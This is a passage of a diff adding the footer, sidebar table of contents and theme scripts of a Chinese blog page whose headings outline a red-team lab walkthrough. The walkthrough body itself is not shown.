+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5-ret2dlresolve/" rel="prev" title="动态链接-ret2dlresolve">
+      <i class="fa fa-chevron-left"></i> 动态链接-ret2dlresolve
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/18/CVE-2013-2551%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="CVE-2013-2551漏洞分析">
+      CVE-2013-2551漏洞分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#vulnstack-ATT-amp-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80"><span class="nav-text">vulnstack-ATT&amp;CK红队实战靶场一</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">一、环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81web%E6%94%BB%E5%87%BB"><span class="nav-text">二、web攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E6%95%B0%E6%8D%AE%E5%BA%93getshell"><span class="nav-text">mysql数据库getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87yxcms-getshell"><span class="nav-text">通过yxcms getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-text">三、内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SMB-Beacon"><span class="nav-text">SMB Beacon</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8"><span class="nav-text">MSF实现内网漫游</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91"><span class="nav-text">路由转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞发现利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">四、参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/hqz66" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hqz66" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1219089065@gmail.com" title="E-Mail → 1219089065@gmail.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">40k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">37 分钟</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
